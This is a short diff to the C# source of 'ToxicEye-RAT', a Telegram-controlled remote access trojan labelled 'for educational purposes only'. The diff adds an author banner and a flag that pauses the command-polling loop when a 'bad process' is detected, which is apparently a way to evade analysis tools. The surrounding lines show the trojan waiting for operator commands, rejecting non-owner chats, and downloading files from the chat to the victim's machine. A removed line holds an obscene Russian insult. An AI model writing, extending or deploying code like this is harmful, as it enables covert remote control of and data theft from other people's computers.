@@ -1,4 +1,12 @@
-﻿using System;
+﻿/* 
+       ^ Author    : LimerBoy
+       ^ Name      : ToxicEye-RAT
+       ^ Github    : https:github.com/LimerBoy
+
+       > This program is distributed for educational purposes only.
+*/
+
+using System;
 using System.IO;
 using System.Net;
 using System.Net.Http;
@@ -11,6 +19,10 @@ namespace TelegramRAT
     {
         // Thread
         public static Thread waitCommandsThread = new Thread(waitCommands);
+        // Thread is blocked
+        public static bool waitThreadIsBlocked = false;
+     
+
 
         // Wait commands
         private static void waitCommands()
@@ -25,6 +37,13 @@ namespace TelegramRAT
             // Get commands
             while(true)
             {
+                // If detected bad process
+                if(waitThreadIsBlocked)
+                {
+                    Thread.Sleep(200);
+                    continue;
+                }
+
                 // Sleep
                 Thread.Sleep(config.TelegramCommandCheckDelay * 1000);
                 // Get commands
@@ -41,7 +60,7 @@ namespace TelegramRAT
                     // If not the creator of the bot writes
                     if (chatid != config.TelegramChatID)
                     {
-                        sendText("👑 You not my owner, поэтому отсоси мой божественный член сука!", chatid);
+                        sendText("👑 You not my owner!", chatid);
                         Console.WriteLine(chatid);
                     }
                     // Download file from chat to computer
